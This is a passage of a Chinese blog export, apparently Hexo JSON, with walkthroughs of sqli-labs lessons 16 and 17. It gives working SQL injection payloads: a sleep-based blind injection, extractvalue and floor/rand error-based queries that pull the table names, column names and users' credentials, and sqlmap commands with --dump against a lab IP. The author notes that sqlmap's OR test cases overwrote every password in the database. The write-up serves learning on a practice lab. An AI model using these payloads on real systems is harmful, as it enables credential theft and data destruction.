查看Lesson-9%}\n\n","slug":"sqli-labs-lession-16-POST双引号布尔型时间盲注","published":1,"updated":"2019-06-19T17:23:13.386Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istcu00264dsbg1b9fwsq","content":"<h1 id=\"sqli-labs-lession-16-POST双引号布尔型时间盲注\"><a href=\"#sqli-labs-lession-16-POST双引号布尔型时间盲注\" class=\"headerlink\" title=\"sqli-labs-lession 16 POST双引号布尔型时间盲注\"></a>sqli-labs-lession 16 POST双引号布尔型时间盲注</h1><h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-16/1.png\" alt=\"1\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>和lession-15一样是布尔型时间盲注,只是闭合不同</p>\n<h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p><code>admin&quot;) and if(1,sleep(60),null)#</code></p>\n<p>测试出类型为字符型</p>\n<p><img src=\"/img/sql/Lesson-16/2.png\" alt=\"2\"></p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><a href=\"/2018/09/26/sqli-labs-lession-9-GET单引号基于时间盲注/\" title=\"查看Lesson-9\">查看Lesson-9</a>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-16-POST双引号布尔型时间盲注\"><a href=\"#sqli-labs-lession-16-POST双引号布尔型时间盲注\" class=\"headerlink\" title=\"sqli-labs-lession 16 POST双引号布尔型时间盲注\"></a>sqli-labs-lession 16 POST双引号布尔型时间盲注</h1><h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-16/1.png\" alt=\"1\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>和lession-15一样是布尔型时间盲注,只是闭合不同</p>\n<h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p><code>admin&quot;) and if(1,sleep(60),null)#</code></p>\n<p>测试出类型为字符型</p>\n<p><img src=\"/img/sql/Lesson-16/2.png\" alt=\"2\"></p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><a href=\"/2018/09/26/sqli-labs-lession-9-GET单引号基于时间盲注/\" title=\"查看Lesson-9\">查看Lesson-9</a>\n\n"},{"title":"sqli-labs lession 17 POST基于错误的更新","date":"2018-09-28T01:11:00.000Z","_content":"# sqli-labs lession 17 POST基于错误的更新 #\n---\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-17/1.png)\n\n## 手注 ##\n\n### 分析 ###\n\n根据题目意思要利用的是Update的错误。先检查一下UserName这一块。\n\n发现输入一些信息后无论怎样都没触发错误。检查源码\n\n![2](/img/sql/Lesson-17/2.png)\n\n发现uname被check_input函数处理了。通读代码,理解一下什么意思。\n\n\tfunction check_input($value)\n\t{\n\tif(!empty($value))\n\t\t//检查传入的账号名为非空\n\t\t{\n\t\t// truncation (see comments)\n\t\t$value = substr($value,0,15);\n\t\t//限制用户名长度为15以下,如果传入的用户名超过15位会只使用前15位\n\t\t}\n\t\n\t\t// Stripslashes if magic quotes enabled\n\t\tif (get_magic_quotes_gpc())\n\t\t//获取当前php.ini配置文件中magic_quotes_gpc的配置选项设置\n\n<font color=red>用phpstudy切换版本php5.2.17+Aphache</font>\n\n可以看到php.ini配置文件中`magic_quotes_gpc`配置打开了。\n\n![3](/img/sql/Lesson-17/3.png)\n\n在php.net查看该函数详细信息。\n\n![4](/img/sql/Lesson-17/4.png)\n\n\n* 当php.ini里的magic_quotes_gpc=On时，提交的变量中所有的单引号，双引号，反斜线，NUL（NULL字符）会自动转为含有反斜线的转义字符\n\n* 魔术引号（Magic Quote）是一个自动将进入PHP脚本的数据进行转义的过程。（对所有的GET，POST，Cookie数据进行转义）\n\n这就是我输入的数据没被数据库解析的原因,它把引号转义了。\n\n\t\t\t{\n\t\t\t$value = stripslashes($value);\n\t\t\t//使用stripslashes()去掉多余的反斜杠\n\t\t\t}\n\t\n\t\t// Quote if not a number\n\t\tif (!ctype_digit($value))\n\t\t\t//检查$value是不是十进制数字,如果不是就执行if中的语句\n\n![5](/img/sql/Lesson-17/5.png)\n\n给特殊字符添加转义\n\n\t\t\t{\n\t\t\t$value = \"'\" . mysql_real_escape_string($value) . \"'\";\n\t\t\t//转义特殊字符并用''拼接\n\t\t\t}\n\t\telse\n\t\t\t{\n\t\t\t$value = intval($value);\n\t\t\t//获取$value的整数值\n\t\t\t}\n\t\treturn $value;\n\t}\n\n写个`admin'`进去,它就做了如下处理\n\n![6](/img/sql/Lesson-17/6.png)\n\n根据上述username不是很好利用,利用password。因为password没有经过函数过滤。\n\n![7](/img/sql/Lesson-17/7.png)\n\n根据题目提示,发现这里其实是一个update的功能,用来修改账户的密码。\n\n只要用户名查询存在,可以修改任意密码。\n\n![8](/img/sql/Lesson-17/8.png)\n\n修改admin用户密码为123456,提交。\n\n![9](/img/sql/Lesson-17/9.png)\n\n密码修改成功。\n\n### 判断类型 ###\n\n为了实验成功先确认php.ini文件中`magic_quotes_gpc`为`Off`,因为它是一个全局配置,启用下会将对POST请求的password中的特殊字符转义。\n\n![10](/img/sql/Lesson-17/10.png)\n\n单引号报错,构造报错注入。\n\n### 获取当前数据库 ###\n\n`' and extractvalue(null,concat(0x7e,database(),0x7e))#`\n\n![11](/img/sql/Lesson-17/11.png)\n\n### 获取表 ###\n\n`' and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))#`\n\n![12](/img/sql/Lesson-17/12.png)\n\n### 获取列 ###\n\n`' and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e))#`\n\n![13](/img/sql/Lesson-17/13.png)\n\n### 获取字段值 ###\n\n![14](/img/sql/Lesson-17/14.png)\n\n`' and (select 1 from (select count(*),concat((select concat(id,'-',username,'-',password) from security.users limit 0,1), '~' , floor (rand()*2))as a from information_schema.tables group by a) as b limit 0,1) #`\n\n## SQLMAP ##\n\n`sqlmap -u http://10.60.250.66/sqlilabs/Less-17/ --data \"uname=admin&passwd='and 1=2&submit=Submit\" --threads 10 --technique E`\n\n![15](/img/sql/Lesson-17/15.png)\n\n\n![16](/img/sql/Lesson-17/16.png)\n\n`sqlmap -u http://10.60.250.66/sqlilabs/Less-17/ --data \"uname=admin&passwd='and 1=2&submit=Submit\" -D security -T users --columns --dump`\n\n![17](/img/sql/Lesson-17/17.png)\n\n我擦,sqlmap这个payload把密码全改成了0,这个有待观察。\n\n查了一些资料,终于找到问题了,update报错注入要注意不能带入or的测试用例,不然会给数据库数据带来翻天覆地的变化。下面我的url地址换了,不过其实一样。\n\n刚开始数据库信息:\n\n![18](/img/sql/Lesson-17/18.png)\n\n```\n--data:指定请求信息\n\n-p:指定参数\n\n--dbms:指定后端数据库\n\n--threads:指定并发线程数\n\n--method:指定请求方式\n\n--flush-session:清除session\n\n--fresh-queries:发起新的请求\n\n--level 1:尝试POST和GET注入 \n\n--risk 1:仅测试常见用例\n\n--technique E:仅测试报错注入方式\n```\n\n`sqlmap -u \"http://10.60.250.66/sql/Less-17/\" --data \"uname=admin&passwd=woshiadmin&submit=Submit\" -p passwd --dbms mysql --threads 10 --method POST --flush-session --fresh-queries --level 1 --risk 1 --technique E`\n\n![19](/img/sql/Lesson-17/19.png)\n\n在出现这条提示后先不要执行,查看数据库,发现admin账号的密码被修改。\n\n![20](/img/sql/Lesson-17/20.png)\n\n<font color=red>已经找到了可能注入点,不需要测试所有用例,因为所有用例中必定会有or的用例,会对数据库进行破坏,选n</font>\n\n![21](/img/sql/Lesson-17/21.png)\n\n继续用no\n\n![22](/img/sql/Lesson-17/22.png)\n\n接下来就对了。\n\n`sqlmap -u \"http://10.60.250.66/sql/Less-17/\" --data \"uname=admin&passwd=woshiadmin&submit=Submit\" -p passwd --dbms mysql --threads 10 --method POST  --level 1 --risk 1 --technique E -D security -T users --columns --dump`\n\n![23](/img/sql/Lesson-17/23.png)","source":"_posts/sqli-labs-lession-17-POST基于错误的更新.md","raw":"---\ntitle: sqli-labs lession 17 POST基于错误的更新\ndate: 2018-09-28 09:11:00\ntags: [sqli-labs]\ncategories: sql注入\n---\n# sqli-labs lession 17 POST基于错误的更新 #\n---\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-17/1.png)\n\n## 手注 ##\n\n### 分析 ###\n\n根据题目意思要利用的是Update的错误。先检查一下UserName这一块。\n\n发现输入一些信息后无论怎样都没触发错误。检查源码\n\n![2](/img/sql/Lesson-17/2.png)\n\n发现uname被check_input函数处理了。通读代码,理解一下什么意思。\n\n\tfunction check_input($value)\n\t{\n\tif(!empty($value))\n\t\t//检查传入的账号名为非空\n\t\t{\n\t\t// truncation (see comments)\n\t\t$value = substr($value,0,15);\n\t\t//限制用户名长度为15以下,如果传入的用户名超过15位会只使用前15位\n\t\t}\n\t\n\t\t// Stripslashes if magic quotes enabled\n\t\tif (get_magic_quotes_gpc())\n\t\t//获取当前php.ini配置文件中magic_quotes_gpc的配置选项设置\n\n<font color=red>用phpstudy切换版本php5.2.17+Aphache</font>\n\n可以看到php.ini配置文件中`magic_quotes_gpc`配置打开了。\n\n![3](/img/sql/Lesson-17/3.png)\n\n在php.net查看该函数详细信息。\n\n![4](/img/sql/Lesson-17/4.png)\n\n\n* 当php.ini里的magic_quotes_gpc=On时，提交的变量中所有的单引号，双引号，反斜线，NUL（NULL字符）会自动转为含有反斜线的转义字符\n\n* 魔术引号（Magic Quote）是一个自动将进入PHP脚本的数据进行转义的过程。（对所有的GET，POST，Cookie数据进行转义）\n\n这就是我输入的数据没被数据库解析的原因,它把引号转义了。\n\n\t\t\t{\n\t\t\t$value = stripslashes($value);\n\t\t\t//使用stripslashes()去掉多余的反斜杠\n\t\t\t}\n\t\n\t\t// Quote if not a number\n\t\tif (!ctype_digit($value))\n\t\t\t//检查$value是不是十进制数字,如果不是就执行if中的语句\n\n![5](/img/sql/Lesson-17/5.png)\n\n给特殊字符添加转义\n\n\t\t\t{\n\t\t\t$value = \"'\" . mysql_real_escape_string($value) . \"'\";\n\t\t\t//转义特殊字符并用''拼接\n\t\t\t}\n\t\telse\n\t\t\t{\n\t\t\t$value = intval($value);\n\t\t\t//获取$value的整数值\n\t\t\t}\n\t\treturn $value;\n\t}\n\n写个`admin'`进去,它就做了如下处理\n\n![6](/img/sql/Lesson-17/6.png)\n\n根据上述username不是很好利用,利用password。因为password没有经过函数过滤。\n\n![7](/img/sql/Lesson-17/7.png)\n\n根据题目提示,发现这里其实是一个update的功能,用来修改账户的密码。\n\n只要用户名查询存在,可以修改任意密码。\n\n![8](/img/sql/Lesson-17/8.png)\n\n修改admin用户密码为123456,提交。\n\n![9](/img/sql/Lesson-17/9.png)\n\n密码修改成功。\n\n### 判断类型 ###\n\n为了实验成功先确认php.ini文件中`magic_quotes_gpc`为`Off`,因为它是一个全局配置,启用下会将对POST请求的password中的特殊字符转义。\n\n![10](/img/sql/Lesson-17/10.png)\n\n单引号报错,构造报错注入。\n\n### 获取当前数据库 ###\n\n`' and extractvalue(null,concat(0x7e,database(),0x7e))#`\n\n![11](/img/sql/Lesson-17/11.png)\n\n### 获取表 ###\n\n`' and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))#`\n\n![12](/img/sql/Lesson-17/12.png)\n\n### 获取列 ###\n\n`' and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e))#`\n\n![13](/img/sql/Lesson-17/13.png)\n\n### 获取字段值 ###\n\n![14](/img/sql/Lesson-17/14.png)\n\n`' and (select 1 from (select count(*),concat((select concat(id,'-',username,'-',password) from security.users limit 0,1), '~' , floor (rand()*2))as a from information_schema.tables group by a) as b limit 0,1) #`\n\n## SQLMAP ##\n\n`sqlmap -u http://10.60.250.66/sqlilabs/Less-17/ --data \"uname=admin&passwd='and 1=2&submit=Submit\" --threads 10 --technique E`\n\n![15](/img/sql/Lesson-17/15.png)\n\n\n![16](/img/sql/Lesson-17/16.png)\n\n`sqlmap -u http://10.60.250.66/sqlilabs/Less-17/ --data \"uname=admin&passwd='and 1=2&submit=Submit\" -D security -T users --columns --dump`\n\n![17](/img/sql/Lesson-17/17.png)\n\n我擦,sqlmap这个payload把密码全改成了0,这个有待观察。\n\n查了一些资料,终于找到问题了,update报错注入要注意不能带入or的测试用例,不然会给数据库数据带来翻天覆地的变化。下面我的url地址换了,不过其实一样。\n\n刚开始数据库信息:\n\n![18](/img/sql/Lesson-17/18.png)\n\n```\n--data:指定请求信息\n\n-p:指定参数\n\n--dbms:指定后端数据库\n\n--threads:指定并发线程数\n\n--method:指定请求方式\n\n--flush-session:清除session\n\n--fresh-queries:发起新的请求\n\n--level 1:尝试POST和GET注入 \n\n--risk 1:仅测试常见用例\n\n--technique E:仅测试报错注入方式\n```\n\n`sqlmap -u \"http://10.60.250.66/sql/Less-17/\" --data \"uname=admin&passwd=woshiadmin&submit=Submit\" -p passwd --dbms mysql --threads 10 --method POST --flush-session --fresh-queries --level 1 --risk 1 --technique E`\n\n![19](/img/sql/Lesson-17/19.png)\n\n在出现这条提示后先不要执行,查看数据库,发现admin账号的密码被修改。\n\n![20](/img/sql/Lesson-17/20.png)\n\n<font color=red>已经找到了可能注入点,不需要测试所有用例,因为所有用例中必定会有or的用例,会对数据库进行破坏,选n</font>\n\n![21](/img/sql/Lesson-17/21.png)\n\n继续用no\n\n![22](/img/sql/Lesson-17/22.png)\n\n接下来就对了。\n\n`sqlmap -u \"http://10.60.250.66/sql/Less-17/\" --data \"uname=admin&passwd=woshiadmin&submit=Submit\" -p passwd --dbms mysql --threads 10 --method POST  --level 1 --risk 1 --technique E -D security -T users --columns --dump`\n\n![23](/img/sql/Lesson-17/23.png)","slug":"sqli-labs-lession-17-POST基于错误的更新","published":1,"updated":"2019-06-19T17:23:13.386Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istcv00294dsbgrztga1b","content":"<h1 id=\"sqli-labs-lession-17-POST基于错误的更新\"><a href=\"#sqli-labs-lession-17-POST基于错误的更新\" class=\"headerlink\" title=\"sqli-labs lession 17 POST基于错误的更新\"></a>sqli-labs lession 17 POST基于错误的更新</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-17/1.png\" alt=\"1\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>根据题目意思要利用的是Update的错误。先检查一下UserName这一块。</p>\n<p>发现输入一些信息后无论怎样都没触发错误。检查源码</p>\n<p><img src=\"/img/sql/Lesson-17/2.png\" alt=\"2\"></p>\n<p>发现uname被check_input函数处理了。通读代码,理解一下什么意思。</p>\n<pre><code>function check_input($value)\n{\nif(!empty($value))\n    //检查传入的账号名为非空\n    {\n    // truncation (see comments)\n    $value = substr($value,0,15);\n    //限制用户名长度为15以下,如果传入的用户名超过15位会只使用前15位\n    }\n\n    // Stripslashes if magic quotes enabled\n    if (get_magic_quotes_gpc())\n    //获取当前php.ini配置文件中magic_quotes_gpc的配置选项设置</code></pre><p><font color=\"red\">用phpstudy切换版本php5.2.17+Aphache</font></p>\n<p>可以看到php.ini配置文件中<code>magic_quotes_gpc</code>配置打开了。</p>\n<p><img src=\"/img/sql/Lesson-17/3.png\" alt=\"3\"></p>\n<p>在php.net查看该函数详细信息。</p>\n<p><img src=\"/img/sql/Lesson-17/4.png\" alt=\"4\"></p>\n<ul>\n<li><p>当php.ini里的magic_quotes_gpc=On时，提交的变量中所有的单引号，双引号，反斜线，NUL（NULL字符）会自动转为含有反斜线的转义字符</p>\n</li>\n<li><p>魔术引号（Magic Quote）是一个自动将进入PHP脚本的数据进行转义的过程。（对所有的GET，POST，Cookie数据进行转义）</p>\n</li>\n</ul>\n<p>这就是我输入的数据没被数据库解析的原因,它把引号转义了。</p>\n<pre><code>    {\n    $value = stripslashes($value);\n    //使用stripslashes()去掉多余的反斜杠\n    }\n\n// Quote if not a number\nif (!ctype_digit($value))\n    //检查$value是不是十进制数字,如果不是就执行if中的语句</code></pre><p><img src=\"/img/sql/Lesson-17/5.png\" alt=\"5\"></p>\n<p>给特殊字符添加转义</p>\n<pre><code>        {\n        $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;\n        //转义特殊字符并用&apos;&apos;拼接\n        }\n    else\n        {\n        $value = intval($value);\n        //获取$value的整数值\n        }\n    return $value;\n}</code></pre><p>写个<code>admin&#39;</code>进去,它就做了如下处理</p>\n<p><img src=\"/img/sql/Lesson-17/6.png\" alt=\"6\"></p>\n<p>根据上述username不是很好利用,利用password。因为password没有经过函数过滤。</p>\n<p><img src=\"/img/sql/Lesson-17/7.png\" alt=\"7\"></p>\n<p>根据题目提示,发现这里其实是一个update的功能,用来修改账户的密码。</p>\n<p>只要用户名查询存在,可以修改任意密码。</p>\n<p><img src=\"/img/sql/Lesson-17/8.png\" alt=\"8\"></p>\n<p>修改admin用户密码为123456,提交。</p>\n<p><img src=\"/img/sql/Lesson-17/9.png\" alt=\"9\"></p>\n<p>密码修改成功。</p>\n<h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p>为了实验成功先确认php.ini文件中<code>magic_quotes_gpc</code>为<code>Off</code>,因为它是一个全局配置,启用下会将对POST请求的password中的特殊字符转义。</p>\n<p><img src=\"/img/sql/Lesson-17/10.png\" alt=\"10\"></p>\n<p>单引号报错,构造报错注入。</p>\n<h3 id=\"获取当前数据库\"><a href=\"#获取当前数据库\" class=\"headerlink\" title=\"获取当前数据库\"></a>获取当前数据库</h3><p><code>&#39; and extractvalue(null,concat(0x7e,database(),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-17/11.png\" alt=\"11\"></p>\n<h3 id=\"获取表\"><a href=\"#获取表\" class=\"headerlink\" title=\"获取表\"></a>获取表</h3><p><code>&#39; and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-17/12.png\" alt=\"12\"></p>\n<h3 id=\"获取列\"><a href=\"#获取列\" class=\"headerlink\" title=\"获取列\"></a>获取列</h3><p><code>&#39; and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-17/13.png\" alt=\"13\"></p>\n<h3 id=\"获取字段值\"><a href=\"#获取字段值\" class=\"headerlink\" title=\"获取字段值\"></a>获取字段值</h3><p><img src=\"/img/sql/Lesson-17/14.png\" alt=\"14\"></p>\n<p><code>&#39; and (select 1 from (select count(*),concat((select concat(id,&#39;-&#39;,username,&#39;-&#39;,password) from security.users limit 0,1), &#39;~&#39; , floor (rand()*2))as a from information_schema.tables group by a) as b limit 0,1) #</code></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u http://10.60.250.66/sqlilabs/Less-17/ --data &quot;uname=admin&amp;passwd=&#39;and 1=2&amp;submit=Submit&quot; --threads 10 --technique E</code></p>\n<p><img src=\"/img/sql/Lesson-17/15.png\" alt=\"15\"></p>\n<p><img src=\"/img/sql/Lesson-17/16.png\" alt=\"16\"></p>\n<p><code>sqlmap -u http://10.60.250.66/sqlilabs/Less-17/ --data &quot;uname=admin&amp;passwd=&#39;and 1=2&amp;submit=Submit&quot; -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-17/17.png\" alt=\"17\"></p>\n<p>我擦,sqlmap这个payload把密码全改成了0,这个有待观察。</p>\n<p>查了一些资料,终于找到问题了,update报错注入要注意不能带入or的测试用例,不然会给数据库数据带来翻天覆地的变化。下面我的url地址换了,不过其实一样。</p>\n<p>刚开始数据库信息:</p>\n<p><img src=\"/img/sql/Lesson-17/18.png\" alt=\"18\"></p>\n<figure class=\"highlight oxygene\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--data:指定请求信息</span><br><span class=\"line\"></span><br><span class=\"line\">-p:指定参数</span><br><span class=\"line\"></span><br><span class=\"line\">--dbms:指定后端数据库</span><br><span class=\"line\"></span><br><span class=\"line\">--threads:指定并发线程数</span><br><span class=\"line\"></span><br><span class=\"line\">--<span class=\"function\"><span class=\"keyword\">method</span>:</span>指定请求方式</span><br><span class=\"line\"></span><br><span class=\"line\">--flush-session:清除session</span><br><span class=\"line\"></span><br><span class=\"line\">--fresh-queries:发起新的请求</span><br><span class=\"line\"></span><br><span class=\"line\">--level <span class=\"number\">1</span>:尝试POST和GET注入 </span><br><span class=\"line\"></span><br><span class=\"line\">--risk <span class=\"number\">1</span>:仅测试常见用例</span><br><span class=\"line\"></span><br><span class=\"line\">--technique E:仅测试报错注入方式</span><br></pre></td></tr></table></figure>\n\n<p><code>sqlmap -u &quot;http://10.60.250.66/sql/Less-17/&quot; --data &quot;uname=admin&amp;passwd=woshiadmin&amp;submit=Submit&quot; -p passwd --dbms mysql --threads 10 --method POST --flush-session --fresh-queries --level 1 --risk 1 --technique E</code></p>\n<p><img src=\"/img/sql/Lesson-17/19.png\" alt=\"19\"></p>\n<p>在出现这条提示后先不要执行,查看数据库,发现admin账号的密码被修改。</p>\n<p><img src=\"/img/sql/Lesson-17/20.png\" alt=\"20\"></p>\n<p><font color=\"red\">已经找到了可能注入点,不需要测试所有用例,因为所有用例中必定会有or的用例,会对数据库进行破坏,选n</font></p>\n<p><img src=\"/img/sql/Lesson-17/21.png\" alt=\"21\"></p>\n<p>继续用no</p>\n<p><img src=\"/img/sql/Lesson-17/22.png\" alt=\"22\"></p>\n<p>接下来就对了。</p>\n<p><code>sqlmap -u &quot;http://10.60.250.66/sql/Less-17/&quot; --data &quot;uname=admin&amp;passwd=woshiadmin&amp;submit=Submit&quot; -p passwd --dbms mysql --threads 10 --method POST  --level 1 --risk 1 --technique E -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-17/23.png\" alt=\"23\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-17-POST基于错误的更新\"><a href=\"#sqli-labs-lession-17-POST基于错误的更新\" class=\"headerlink\" title=\"sqli-labs lession 17 POST基于错误的更新\"></a>sqli-labs lession 17 POST基于错误的更新</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-17/1.png\" alt=\"1\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>根据题目意思要利用的是Update的错误。先检查一下UserName这一块。</p>\n<p>发现输入一些信息后无论怎样都没触发错误。检查源码</p>\n<p><img src=\"/img/sql/Lesson-17/2.png\" alt=\"2\"></p>\n<p>发现uname被check_input函数处理了。通读代码,理解一下什么意思。</p>\n<pre><code>function check_input($value)\n{\nif(!empty($value))\n    //检查传入的账号名为非空\n    {\n    // truncation (see comments)\n    $value = substr($value,0,15);\n    //限制用户名长度为15以下,如果传入的用户名超过15位会只使用前15位\n    }\n\n    // Stripslashes if magic quotes enabled\n    if (get_magic_quotes_gpc())\n    //获取当前php.ini配置文件中magic_quotes_gpc的配置选项设置</code></pre><p><font color=\"red\">用phpstudy切换版本php5.2.17+Aphache</font></p>\n<p>可以看到php.ini配置文件中<code>magic_quotes_gpc</code>配置打开了。</p>\n<p><img src=\"/img/sql/Lesson-17/3.png\" alt=\"3\"></p>\n<p>在php.net查看该函数详细信息。</p>\n<p><img src=\"/img/sql/Lesson-17/4.png\" alt=\"4\"></p>\n<ul>\n<li><p>当php.ini里的magic_quotes_gpc=On时，提交的变量中所有的单引号，双引号，反斜线，NUL（NULL字符）会自动转为含有反斜线的转义字符</p>\n</li>\n<li><p>魔术引号（Magic Quote）是一个自动将进入PHP脚本的数据进行转义的过程。（对所有的GET，POST，Cookie数据进行转义）</p>\n</li>\n</ul>\n<p>这就是我输入的数据没被数据库解析的原因,它把引号转义了。</p>\n<pre><code>    {\n    $value = stripslashes($value);\n    //使用stripslashes()去掉多余的反斜杠\n    }\n\n// Quote if not a number\nif (!ctype_digit($value))\n    //检查$value是不是十进制数字,如果不是就执行if中的语句</code></pre><p><img src=\"/img/sql/Lesson-17/5.png\" alt=\"5\"></p>\n<p>给特殊字符添加转义</p>\n<pre><code>        {\n        $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;\n        //转义特殊字符并用&apos;&apos;拼接\n        }\n    else\n        {\n        $value = intval($value);\n        //获取$value的整数值\n        }\n    return $value;\n}</code></pre><p>写个<code>admin&#39;</code>进去,它就做了如下处理</p>\n<p><img src=\"/img/sql/Lesson-17/6.png\" alt=\"6\"></p>\n<p>根据上述username不是很好利用,利用password。因为password没有经过函数过滤。</p>\n<p><img src=\"/img/sql/Lesson-17/7.png\" alt=\"7\"></p>\n<p>根据题目提示,发现这里其实是一个update的功能,用来修改账户的密码。</p>\n<p>只要用户名查询存在,可以修改任意密码。</p>\n<p><img src=\"/img/sql/Lesson-17/8.png\" alt=\"8\"></p>\n<p>修改admin用户密码为123456,提交。</p>\n<p><img src=\"/img/sql/Lesson-17/9.png\" alt=\"9\"></p>\n<p>密码修改成功。</p>\n<h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p>为了实验成功先确认php.ini文件中<code>magic_quotes_gpc</code>为<code>Off</code>,因为它是一个全局配置,启用下会将对POST请求的password中的特殊字符转义。</p>\n<p><img src=\"/img/sql/Lesson-17/10.png\" alt=\"10\"></p>\n<p>单引号报错,构造报错注入。</p>\n<h3 id=\"获取当前数据库\"><a href=\"#获取当前数据库\" class=\"headerlink\" title=\"获取当前数据库\"></a>获取当前数据库</h3><p><code>&#39; and extractvalue(null,concat(0x7e,database(),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-17/11.png\" alt=\"11\"></p>\n<h3 id=\"获取表\"><a href=\"#获取表\" class=\"headerlink\" title=\"获取表\"></a>获取表</h3><p><code>&#39; and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-17/12.png\" alt=\"12\"></p>\n<h3 id=\"获取列\"><a href=\"#获取列\" class=\"headerlink\" title=\"获取列\"></a>获取列</h3><p><code>&#39; and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-17/13.png\" alt=\"13\"></p>\n<h3 id=\"获取字段值\"><a href=\"#获取字段值\" class=\"headerlink\" title=\"获取字段值\"></a>获取字段值</h3><p><img src=\"/img/sql/Lesson-17/14.png\" alt=\"14\"></p>\n<p><code>&#39; and (select 1 from (select count(*),concat((select concat(id,&#39;-&#39;,username,&#39;-&#39;,password) from security.users limit 0,1), &#39;~&#39; , floor (rand()*2))as a from information_schema.tables group by a) as b limit 0,1) #</code></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u http://10.60.250.66/sqlilabs/Less-17/ --data &quot;uname=admin&amp;passwd=&#39;and 1=2&amp;submit=Submit&quot; --threads 10 --technique E</code></p>\n<p><img src=\"/img/sql/Lesson-17/15.png\" alt=\"15\"></p>\n<p><img src=\"/img/sql/Lesson-17/16.png\" alt=\"16\"></p>\n<p><code>sqlmap -u http://10.60.250.66/sqlilabs/Less-17/ --data &quot;uname=admin&amp;passwd=&#39;and 1=2&amp;submit=Submit&quot; -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-17/17.png\" alt=\"17\"></p>\n<p>我擦,sqlmap这个payload把密码全改成了0,这个有待观察。</p>\n<p>查了一些资料,终于找到问题了,update报错注入要注意不能带入or的测试用例,不然会给数据库数据带来翻天覆地的变化。下面我的url地址换了,不过其实一样。</p>\n<p>刚开始数据库信息:</p>\n<p><img src=\"/img/sql/Lesson-17/18.png\" alt=\"18\"></p>\n<figure class=\"highlight oxygene\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span 